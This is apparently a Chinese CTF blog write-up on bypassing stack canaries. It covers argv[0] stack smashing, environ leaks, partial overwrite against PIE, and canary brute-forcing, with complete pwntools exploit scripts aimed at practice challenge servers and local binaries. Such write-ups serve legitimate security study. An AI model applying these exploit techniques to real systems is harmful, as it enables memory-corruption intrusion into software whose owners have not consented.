---
title: 花式栈溢出技巧
date: 2023-07-19 10:45:50
tags: [Pwn,Stack]
cover: "https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/trickscover.jpg"
categories: [Study]
---

Canary是一种用于检测缓冲区溢出和内存错误的特殊字符。Canary的值通常是一个非常特殊的值，它在内存中很难被覆盖或修改。在程序运行时，Canary会存储在特定的内存位置上，当程序尝试访问或写入该内存位置时，Canary的值将被更改。如果Canary的值在程序执行期间被更改，那么就存在缓冲区溢出或内存错误。但是有一些可以绕过它的方法。

# 一、Stack smash

## 1.1 介绍

在程序加了 canary 保护之后，如果我们输入的内容覆盖掉 canary 的话就会报错，程序就会执行 stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名，但是如果我们能够利用栈溢出控制这个东西，那我们就可以让 stack_chk_fail 打印出我们想要的东西。stack_chk_fail函数如下：

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected"); 
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>"); //打印argv[0]的内容
}
```

执行后如下：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar1.png?x-oss-process=style/watermark)

程序名为/home/ctf/smashes。如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。

## 1.2 例题

题目链接：https://www.jarvisoj.com/ 。题目名字：Smashes ，题目链接  pwn.jarvisoj.com 9877，直接nc就可以连。

反汇编

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar2.png?x-oss-process=style/watermark)

存在Canary保护，且在 _IO_getc(&v4) 处存在栈溢出。程序可以输入两次内容。v4我们可以直接看到有**0x128**位。第一次输入姓名，在第二次输入以后，程序会将原本flag所在的地方byte_600D20的地方改成v2：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar3.png?x-oss-process=style/watermark)

改变之后我们就无法得到flag了，因此我们需要在第一次溢出就打印出flag。

注意，下面有个 memset 指令，也就是说即便你不去第二遍输入程序自己也会给你设置成 0 。memset() 函数用来将指定内存的前n个字节设置为特定的值，其原型为：void * memset( void * ptr, int value, size_t num );  ptr 为要操作的内存的指针。value 为要设置的值。你既可以向 value 传递 int 类型的值，也可以传递 char 类型的值，int 和 char 可以根据 ASCII 码相互转换。num 为 ptr 的前 num 个字节，size_t 就是unsigned int。

溢出之后，程序会打印 argv[0] 指针所指向的字符串，也就是程序名：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar4.png?x-oss-process=style/watermark)

如果我们将argv[0]指向byte_600D20的地方，程序溢出时执行的 __stack_chk_fail 函数就会将flag打印出来。但是第2次输入时，会覆盖掉flag，即使不输入也有memset清除。但我们可以利用ELF 文件的映射，x86-64 程序的映射是从 0x400000 开始的，也就 flag 会在内存中出现两次，分别位于 0x00600d20 和 0x00400d20。这样的话即便被覆盖掉也没事，可以去0x00400d20找。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar5.png?x-oss-process=style/watermark)

查看汇编指令，看一下gets函数的参数：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar6.png?x-oss-process=style/watermark)

现在确定一下 argv[0] 在什么地方，可以直接用可以用 p & __libc_argv[0] 找到这个 argv[0]：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar7.png?x-oss-process=style/watermark)

用这个地址减去rsp的地址

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar8.png?x-oss-process=style/watermark)

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar9.png?x-oss-process=style/watermark)

也就是说，我们输入的内容要 **0x218** 以后才能把 argv[0] 给覆盖掉，那么写了 0x218 之后把 0x00400d20 写上就可以了。

必须设置如下环境变量：LIBC_FATAL_STDERR=1，才能实现将标准错误信息通过管道输出到远程shell中。因此，我们还必须设置该参数。该参数的设置正好用到了我们的第2个输入字符串str，即将“LIBC_FATAL_STDERR_=1”作为str输入进去，并将user字符串的溢出长度再增加16字节。

完整exp如下：

```python
from pwn import *
p=remote('pwn.jarvisoj.com',9877)
p.sendline("A"*0x218 + p64(0x400d20) + p64(0) + p64(0x600D20))
p.sendline("LIBC_FATAL_STDERR_=1")
print p.recvall()
```

成功得到flag:

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/ar10.png?x-oss-process=style/watermark)

## 二、environ

## 2.1 介绍

在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。在内存布局中，如果存储了flag，且environ和flag同属于一个段，那么即使开启ASLR之后，相对位置也不变，偏移量只和libc库有关。

1. 得到libc地址后，libc基址 + environ的偏移量 = environ的地址
2. 通过environ的地址得到environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量

## 2.2 例题

题目：https://buuoj.cn/challenges#wdb2018_guess 。题目名字：wdb2018_guess

IDA反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu1.png?x-oss-process=style/watermark)

程序会先读取flag.txt文件中的内容，然后让用户猜测 flag。一共有三次机会：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu3.png?x-oss-process=style/watermark)

可以看到有 Canary 保护，以及 gets 函数溢出漏洞。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu2.png?x-oss-process=style/watermark)

查看 gets 函数，在0x400b23

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu5.png?x-oss-process=style/watermark)

使用objdump 命令查看汇编代码：gets 函数的参数在 rbp - 0x40 的地方:

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu4.png?x-oss-process=style/watermark)

用gdb对文件进行调试，在gets处下个断点。然后使用p & __libc_argv[0] 找argv[0]的地址，然后计算argv[0]到ebp-0x40的偏移：**0x128**

```shell
p & __libc_argv[0] 
print $ebp-0x40
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu6.png?x-oss-process=style/watermark)

然后通过print打印environ的地址，通过find找到flag的位置，计算其偏移：**0x168**

```shell
print environ
find flag{
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu7.png?x-oss-process=style/watermark)

则falg的地址就是environ的真实地址减去0x168。

先通过第一次溢出，打印出put_addr的真实地址，利用其在libc里面的偏移计算environ的真实地址，然后通过第二次溢出，打印出environ指向的环境变量的地址，然后利用它与flag的偏移，计算出flag的地址，最后通过第三次溢出，打印flag。

完整exp：

```python
from pwn import *
from LibcSearcher import*

p = remote('node4.buuoj.cn',25756)
puts_got = 0x602020

payload = 'a'*0x128 + p64(puts_got) #使argv[0]指向got地址，打印got真实地址
p.sendlineafter("Please type your guessing flag\n",payload)
p.recvuntil("*** stack smashing detected ***: ")
puts_addr = u64(p.recv(6).ljust(8,'\0'))
log.info("puts_addr:%#x",puts_addr)

libc=LibcSearcher('puts',puts_addr)
environ_addr = puts_addr - (libc.dump('puts')-libc.dump('environ'))#计算environ在libc的地址
payload = 'a'*0x128 + p64(environ_addr) #使argv[0]指向environ地址,打印它在内存布局中的地址
p.sendlineafter("Please type your guessing flag\n",payload)
p.recvuntil("*** stack smashing detected ***: ")
environ = u64(p.recv(6).ljust(8,'\0'))
log.info("environ:%#x",environ)

flag_addr = environ - 0x168
payload = 'a'*296 + p64(flag_addr)##使argv[0]指向flag地址,打印flag
p.sendlineafter("Please type your guessing flag\n",payload)
p.interactive()
```

成功得到flag：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/gu8.png?x-oss-process=style/watermark)

------



# 三、partial overwrite

## 3.1 介绍

PIE（Position-Independent Executable）技术是一种将程序编译为位置无关代码的技术。它在编译程序时，生成与位置无关的代码，使得程序在加载时可以随机加载到内存中的任意位置。这样，即使攻击者能够控制程序的一部分内存，也无法确定程序在内存中的实际位置，从而增加了攻击的难度。

我们知道内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程

## 3.2 例题

题目链接：https://buuoj.cn/challenges#linkctf_2018.7_babypie 。题目名字：linkctf_2018.7_babypie

反汇编：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/p1.png?x-oss-process=style/watermark)

存在Canary保护，read读取0x30字节后到buf后，printf 函数会将其打印出来。存在后门：低三位为 'A3E‘

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/p2.png?x-oss-process=style/watermark)

buf大小也为0x30字节，尽管我们不能溢出到返回地址，但是由于Canary在EBP的上面，我们可以利用 printf 函数打印Canary。canary还有一个特点，第一个字符为’\x00’，目的就是为了截断防止泄露出来canary。我们可以将其’\x00’覆盖为一个非零的值。这样就可以打印出canary了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/b1.png?x-oss-process=style/watermark)

第一次 read 的时候读入的是栈大小为：0x30，我们需要 read 的长度是 0x30-0x8+1。+1是为了覆盖 canary 的最低位为非零的值，printf 使用 %s 的时候遇到 \0 结束，覆盖 canary 低位为非零的值的时候就可以被 canary 打印出来了。

然后我们知道指令后三位是不变的，但是我们覆盖只能一个字节一个字节的覆盖。因此想要覆盖后三位，就会覆盖两个字节，就会把第四位也覆盖了。而每位有16种可能，也就是说，有1/16的概率，覆盖的第四位刚好等于系统随机化后的数据。因此可以多次尝试，有概率拿到flag。

exp如下：

```python
from pwn import *
 
while True:
    try:
	#io=process('./babypie',timeout = 1)
        io = remote('node4.buuoj.cn', 25428)
        io.sendafter(":\n", "A" * (0x30 - 0x8 + 1))
        io.recvuntil("A" * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success("0x" + canary.encode("hex"))
        io.sendafter(":\n", "A" * (0x30 - 0x8) + canary + "B" * 8 + '\x3E\x0A')
        io.interactive()
    except Exception as e:
        io.close()
        print e
```

多次尝试后得到flag：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/p3.png?x-oss-process=style/watermark)

事实上，由于题目的特性，read函数指向后，返回的地址也是’A‘开头的，也就是我们不用覆盖第三位，它已经是一样的了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/p4.png?x-oss-process=style/watermark)

只要覆盖后两位，就一定可以成功：

```python
io.sendafter(":\n", "A" * (0x30 - 0x8) + canary + "B" * 8 + '\x3E')
```

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/p5.png?x-oss-process=style/watermark)

# 四、Canary爆破

## 4.1 介绍

在前一篇BROP中我们已经介绍过Canary爆破的原理，复习一下：

Canary爆破原理是，从最低的一个字节开始，逐个字节地改变Canary的值，直到与原始Canary值匹配为止。每次填入一个字节时，程序都会检查是否发生了内存错误或缓冲区溢出。如果填入的值与Canary匹配，则说明该字节是正确的，继续向下爆破。如果填入的值与Canary不匹配，则说明该字节是错误的，需要重新开始爆破。

在32位中，需要爆破四个字节的Canary，只要尝试4×256=1024次就一定可以爆破Canary，64位8个字节，只需要尝试 8×256=2048 次就一定可以爆破Canary。

## 4.2 例题

网上找不到合适的题目，就用之前打比赛的题目吧。

2023ciscn初赛，pwn题：funcanary，我把它上传到阿里云了，题目下载地址：https://wutongblogs.oss-cn-beijing.aliyuncs.com/test/funcanary

拿到题目，首先checksec：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/c1.png?x-oss-process=style/watermark)

保护全开，然后查看反汇编：分析过程不详述了。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/c2.png?x-oss-process=style/watermark)

主函数创建子进程，然后不断执行sub_128A函数。

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/c3.png?x-oss-process=style/watermark)

sub_1100是read函数，v3大小0x78，存在溢出。有canary保护。子进程的canary一样，因此可以爆破canary。

爆破代码：

```python
#python3
from pwn import *
r = process('./funcanary')
canary = b'\x00'
for k in range(7):
    for i in range(256):
        r.recvuntil(b'welcome\n')
        payload=b'a'*0x68 + canary + i.to_bytes(1,'little')
        r.send(payload)
        data = r.recv()
        #print data
        if b'fun' in data:
            canary+=i.to_bytes(1,'little')
            print("canary:"+str(canary))
            break
print("success get blasting!")
```

题目需要GLIBC_2.34的环境，u1s1，这真的很不友好，比赛的时候环境升级来不及，只能远程调试，废了很多时间，哭/大哭/嘤嘤嘤

换了kali的环境，爆破成功：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/c5.jpg?x-oss-process=style/watermark)

忘了说了，程序存在后门：

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/c4.png?x-oss-process=style/watermark)

可以直接拿到flag，PIE只要爆破第四位即可。

完整exp：

```python
from pwn import *

r = process('./funcanary')
canary = b'\x00'
for k in range(7):
    for i in range(256):
        r.recvuntil(b'welcome\n')
        payload=b'a'*0x68 + canary + i.to_bytes(1,'little')
        r.send(payload)
        data = r.recv()
        #print data
        if b'fun' in data:
            canary+=i.to_bytes(1,'little')
            print("canary:"+str(canary))
            break
print("success get blasting!")

context.log_level="debug"
for m in range(16):
    tmp = m * 16 +2 
    payload = b'A'*0x68 + canary + b'B'*0x8  + b'\x31' + tmp.to_bytes(1,'little')
    r.recvuntil(b'welcome\n')
    r.send(payload)
    print('m = ' + str(m))
```

拿到flag：（本地环境，自己写的flag）

![](https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/tricks/c6.jpg?x-oss-process=style/watermark)
